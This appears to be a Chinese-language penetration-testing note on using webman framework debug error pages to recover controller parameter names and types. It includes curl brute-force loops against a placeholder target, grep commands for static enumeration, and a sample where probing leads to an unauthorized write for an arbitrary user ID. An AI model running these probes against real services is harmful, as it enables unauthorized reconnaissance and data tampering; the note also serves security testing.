## 原理：两个必现的 HTML 错误页 = 免费的「方法签名 oracle」

webman 的控制器实参解析（`Webman\App::resolveMethodDependencies()`）在形参取不到值或类型不符时抛异常，
**debug 模式下异常页会把形参名 / 期望类型直接渲染出来**：

| 触发条件 | 响应（HTTP 200，Content-Type: text/html） | 泄露的信息 |
|---|---|---|
| 某个**必填**标量形参在请求里完全没传 | `<h1>Missing input parameter </h1>` | 该方法**存在必填标量形参**（但不给名字） |
| 传了同名参数但类型不符 | `<h1>Input userId must be of type int, string given</h1>` | **★形参真实名字 + 真实类型** |

第二条就是 oracle：**猜中名字 → 报名字和类型；猜错 → 只报 Missing input parameter**。于是可以用"名字字典 + 类型探针"把方法签名爆破出来。

## 为什么这个 oracle 在渗透里值钱

1. **零成本签名反推**：无需源码即可确认线上方法的形参名与类型；
   （拿到形参名后就能按 `<a href="/api/">形参绑定</a>` 的方式直接注入身份/ID）
2. **可达性确认**：能报这两个错，说明该 `/{controller}/{action}` 自动路由**真实可达**；
3. **区分守卫**：回 `Missing input parameter` 说明有必填形参但名字不对；回 `请先登录` 说明方法体自带守卫；
   回业务数据说明**可达且无守卫**。

## 用法（零副作用）

```bash
# 1) 探"是否有必填标量形参"（不带任何参数）
curl -k -s "https://TARGET/api/<controller>/<action>"
#   -> <h1>Missing input parameter </h1>   表示有必填形参

# 2) 用名字字典逐个猜（每个只发一次，间隔 >=5s）
for n in id uid userId memberId order_no trano code type platform name path file url; do
  curl -k -s "https://TARGET/api/<controller>/<action>?$n=abc" | grep -o "Input [a-zA-Z_]* must be of type [a-zA-Z|]*"
done
#   -> "Input order_no must be of type string, int given"  即命中，参数类型一并到手
```

**零副作用保证**：类型不符时异常在**方法体被调用之前**抛出（`target150.example.com:526-537` 在 `resolveMethodDependencies` 内，
`resolveInject` 里 `$call(...$args)` 在其后）→ **方法体永不执行** → 不产生任何业务数据。
所以对**写类/资金类**方法也只用必败参数探，是安全的。

⚠ 例外：若某形参**带默认值**，缺参不会抛异常而是用默认值继续 → 方法体**会执行**。
探之前必须先静态确认"目标形参是必填（签名里没有 `= 默认值`）"，带默认值的写方法**不要不带参探**。

## 静态侧配合（先静态再在线，最省流量）

```bash
# 抽出所有带标量形参的 public 方法（webman 只在方法有"Request 之外的形参"时才走绑定分支）
grep -rn -A2 "public \(static \)\?function" app/controller | grep -E "\\\$[a-z_]+"
```
拿到静态清单后，只对**值得确认的**方法各发 1 次在线探针即可，不必全站盲爆。

## 实测样本（example.com, webman v2.1.2 / workerman v5.1.4, 零凭证）

```
GET /api/user/recordDevice
-> 200 <h1>Missing input parameter </h1>
GET /api/user/recordDevice?userId=abc
-> 200 <h1>Input userId must be of type int, string given</h1>     # ★形参名 userId / 类型 int
GET /api/user/recordDevice?userId=403
-> 200 body=NULL（方法体执行完毕；末尾为 catch(\Exception){} + 隐式 return null）
回读 /api/v1/user/devices（合法 token）新增 device 行 id=1794 -> 未授权任意 uid 写入已落库
```

## 顺手可拿的副产品
- 报错页含 webman 版本字样与异常类名 → 版本/组件指纹；
- `Missing input parameter` 与 `请先登录` 的**差别**可以区分"框架层形参解析"与"业务层守卫"，
  从而快速筛出"有必填形参但没守卫"的方法——即形参绑定的最佳攻击面。